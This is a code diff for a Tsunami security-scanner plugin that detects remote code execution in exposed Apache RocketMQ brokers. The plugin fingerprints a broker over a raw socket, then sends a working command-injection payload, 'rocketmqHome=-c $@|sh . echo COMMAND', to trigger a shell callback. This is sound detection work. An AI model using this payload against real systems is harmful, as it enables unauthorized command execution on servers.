@@ -17,17 +17,15 @@ package com.google.tsunami.plugins.detectors.rce.rocketMQ;
 
 import static com.google.common.base.Preconditions.checkNotNull;
 import static com.google.common.collect.ImmutableList.toImmutableList;
-import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
+import static java.nio.charset.StandardCharsets.UTF_8;
 
 import com.google.common.annotations.VisibleForTesting;
 import com.google.common.collect.ImmutableList;
 import com.google.common.flogger.GoogleLogger;
-import com.google.protobuf.ByteString;
+import com.google.common.net.HostAndPort;
+import com.google.common.util.concurrent.Uninterruptibles;
 import com.google.protobuf.util.Timestamps;
-import com.google.tsunami.common.data.NetworkServiceUtils;
-import com.google.tsunami.common.net.http.HttpClient;
-import com.google.tsunami.common.net.http.HttpHeaders;
-import com.google.tsunami.common.net.http.HttpRequest;
+import com.google.tsunami.common.data.NetworkEndpointUtils;
 import com.google.tsunami.common.time.UtcClock;
 import com.google.tsunami.plugin.PluginType;
 import com.google.tsunami.plugin.VulnDetector;
@@ -46,10 +44,17 @@ import com.google.tsunami.proto.TargetInfo;
 import com.google.tsunami.proto.TextData;
 import com.google.tsunami.proto.Vulnerability;
 import com.google.tsunami.proto.VulnerabilityId;
+import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.lang.annotation.Retention;
+import java.lang.annotation.RetentionPolicy;
+import java.net.Socket;
 import java.time.Clock;
+import java.time.Duration;
 import java.time.Instant;
 import javax.inject.Inject;
+import javax.inject.Qualifier;
+import javax.net.SocketFactory;
 
 /** A Tsunami plugin that detects RCE in RocketMQ exposed broker */
 @PluginInfo(
@@ -74,22 +79,31 @@ public final class RCEInRocketMQWithOpenAccessDetector implements VulnDetector {
 
   @VisibleForTesting static final String VULNERABILITY_REPORT_DETAILS = "";
 
+  private static final Duration BATCH_REQUEST_WAIT_AFTER_TIMEOUT = Duration.ofSeconds(5);
+
   Severity vulnSeverity = Severity.CRITICAL;
+
+  private final SocketFactory socketFactory;
 
   private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
 
   private final Clock utcClock;
-  private final HttpClient httpClient;
   private final PayloadGenerator payloadGenerator;
-  private String PAYLOAD_TEMPLATE = "";
+  private String RCE_TEMPLATE =
+      "`{\"code\":25,\"flag\":0,\"language\":\"JAVA\",\"opaque\":0,\"serializeTypeCurrentRPC\":\"JSON\",\"version\":395}filterServerNums=1\n"
+          + "rocketmqHome=-c $@|sh . echo COMMAND;\n";
+  private static String FINGERPRINT_PAYLOAD =
+      "`{\"code\":12,\"flag\":0,\"language\":\"JAVA\",\"opaque\":0,\"serializeTypeCurrentRPC\":\"JSON\",\"version\":500}\n";
 
   @Inject
   RCEInRocketMQWithOpenAccessDetector(
-      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator)
+      @SocketFactoryInstance SocketFactory socketFactory,
+      @UtcClock Clock utcClock,
+      PayloadGenerator payloadGenerator)
       throws IOException {
     this.utcClock = checkNotNull(utcClock);
-    this.httpClient = checkNotNull(httpClient);
     this.payloadGenerator = checkNotNull(payloadGenerator);
+    this.socketFactory = checkNotNull(socketFactory);
   }
 
   // This is the main entry point of VulnDetector.
@@ -108,66 +122,105 @@ public final class RCEInRocketMQWithOpenAccessDetector implements VulnDetector {
         .build();
   }
 
+  // Helper method to convert hex string to byte array
+  private byte[] hexStringToByteArray(String hex) {
+    int len = hex.length();
+    byte[] data = new byte[len / 2];
+    for (int i = 0; i < len; i += 2) {
+      data[i / 2] =
+          (byte)
+              ((Character.digit(hex.charAt(i), 16) << 4) + Character.digit(hex.charAt(i + 1), 16));
+    }
+    return data;
+  }
+
+  // Helper method to convert hex string to byte array
+  private byte[] addRocketMQHeader(String payload) throws IOException {
+    byte[] buf = payload.getBytes();
+
+    int headerLength = 3;
+    String header = "000000" + Integer.toHexString(buf.length + headerLength) + "000000";
+
+    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+    outputStream.write(hexStringToByteArray(header));
+    outputStream.write(buf);
+
+    return outputStream.toByteArray();
+  }
+
   // Checks whether a given service is a rocketMQ  broker
   private boolean isRocketMQBroker(NetworkService networkService) {
-    // TODO: implement
-    return false;
+    HostAndPort hp = NetworkEndpointUtils.toHostAndPort(networkService.getNetworkEndpoint());
+
+    try {
+      byte[] payload = addRocketMQHeader(FINGERPRINT_PAYLOAD);
+
+      Socket socket = socketFactory.createSocket(hp.getHost(), hp.getPort());
+      socket.setSoTimeout(500);
+
+      socket.getOutputStream().write(payload);
+
+      byte[] responseBuffer = new byte[1024];
+      int bytesRead = socket.getInputStream().read(responseBuffer, 0, responseBuffer.length);
+      if (bytesRead <= 0) {
+        logger.atWarning().log("%d bytes read (-1 means EOF) from service.", bytesRead);
+        return false;
+      }
+
+      String response = new String(responseBuffer, 0, bytesRead, UTF_8);
+
+      return response.contains("org.apache.rocketmq.broker")
+          || response.contains("brokerVersionDesc");
+    } catch (IOException e) {
+      logger.atWarning().log("error during connection to %s: %s", hp.toString(), e);
+      return false;
+    }
   }
 
   private boolean isServiceVulnerable(NetworkService networkService) {
+    HostAndPort hp = NetworkEndpointUtils.toHostAndPort(networkService.getNetworkEndpoint());
+
     // Generate the payload for the callback server
     PayloadGeneratorConfig config =
         PayloadGeneratorConfig.newBuilder()
             .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
             .setInterpretationEnvironment(
-                PayloadGeneratorConfig.InterpretationEnvironment.INTERPRETATION_ANY)
-            .setExecutionEnvironment(PayloadGeneratorConfig.ExecutionEnvironment.EXEC_ANY)
+                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
+            .setExecutionEnvironment(
+                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
             .build();
 
-    String oobCallbackUrl = "";
-    Payload payload = null;
+    Payload callbackPayload = null;
 
-    // Check if the callback server is available, fallback to response matching if not
     try {
-      payload = this.payloadGenerator.generate(config);
-      // Use callback for RCE confirmation and raise severity on success
-      if (payload == null || !payload.getPayloadAttributes().getUsesCallbackServer()) {
-        logger.atWarning().log(
-            "Tsunami Callback Server not available: detector will use response matching only.");
-      } else {
-        oobCallbackUrl = payload.getPayload();
-      }
+      callbackPayload = this.payloadGenerator.generate(config);
     } catch (NotImplementedException e) {
       return false;
     }
 
-    String rmiPayload = PAYLOAD_TEMPLATE.replace("HOST", oobCallbackUrl);
-    String jsonPayload = getJsonPayload(rmiPayload);
-
-    // Send the malicious HTTP request
-    // TODO: add correct uri
-    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + "something";
-    logger.atInfo().log("Sending payload to '%s'", targetUri);
-    HttpRequest req =
-        HttpRequest.post(targetUri)
-            .setHeaders(HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
-            .setRequestBody(ByteString.copyFromUtf8(jsonPayload))
-            .build();
+    if (!callbackPayload.getPayloadAttributes().getUsesCallbackServer()) {
+      logger.atWarning().log("Tsunami Callback Server not available: cannot detect rce");
+      return false;
+    }
 
     try {
-      this.httpClient.send(req, networkService);
+      byte[] payload =
+          addRocketMQHeader(RCE_TEMPLATE.replace("COMMAND", callbackPayload.getPayload()));
+
+      Socket socket = socketFactory.createSocket(hp.getHost(), hp.getPort());
+      socket.getOutputStream().write(payload);
     } catch (IOException e) {
-      e.printStackTrace();
+      logger.atWarning().log("failed to send rce payload to %s", hp.toString());
+      return false;
     }
-    // payload should never be null here as we should have already returned in that case
-    verify(payload != null);
-    if (payload.checkIfExecuted()) {
-      logger.atInfo().log("Vulnerability confirmed via Callback Server.");
+
+    Uninterruptibles.sleepUninterruptibly(BATCH_REQUEST_WAIT_AFTER_TIMEOUT);
+
+    if (callbackPayload.checkIfExecuted()) {
+      logger.atInfo().log("Target %s is vulnerable", hp.toString());
       return true;
     } else {
-      logger.atInfo().log(
-          "Callback not received and response does not match vulnerable instance, instance is not"
-              + " vulnerable.");
+      logger.atInfo().log("Target %s is not vulnerable", hp.toString());
       return false;
     }
   }
@@ -194,4 +247,8 @@ public final class RCEInRocketMQWithOpenAccessDetector implements VulnDetector {
                         .setTextData(TextData.newBuilder().setText(VULNERABILITY_REPORT_DETAILS))))
         .build();
   }
+
+  @Qualifier
+  @Retention(RetentionPolicy.RUNTIME)
+  @interface SocketFactoryInstance {}
 }
